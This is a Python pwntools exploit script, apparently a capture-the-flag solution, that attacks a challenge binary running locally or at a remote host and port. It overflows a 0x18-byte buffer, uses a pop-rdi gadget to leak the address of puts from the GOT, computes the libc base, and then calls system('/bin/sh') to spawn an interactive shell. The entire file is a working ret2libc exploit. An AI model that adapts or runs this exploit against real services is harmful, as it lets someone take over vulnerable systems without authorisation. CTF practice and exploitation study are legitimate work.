#!/usr/bin/env python3

from pwn import *

exe = ELF("../bin/chall")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = exe

host = args.HOST or 'localhost'
port = args.PORT or 31705

def local():
  return process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})

def conn():
  if args.LOCAL:
    return local()
  else:
    return remote(host, port)

def debug():
  if args.LOCAL:
    gdb.attach(r, gdbscript=gdbscript)
    pause()

gdbscript = f'''
file {exe.path}
'''

r = conn()

# good luck pwning :)

rdi = 0x401243
r.sendline(flat([b'A'*0x18, rdi, exe.got['puts'], exe.plt['puts'], exe.sym['main']]))
r.recvuntil(b'Where am I going today?\n')
libc.address = u64(r.recv(6).ljust(8, b'\x00')) - libc.sym['puts']
log.info(hex(libc.address))
r.sendline(flat([b'A'*0x18, rdi, next(libc.search(b'/bin/sh\x00')), rdi + 1, libc.sym['system']]))

r.interactive()
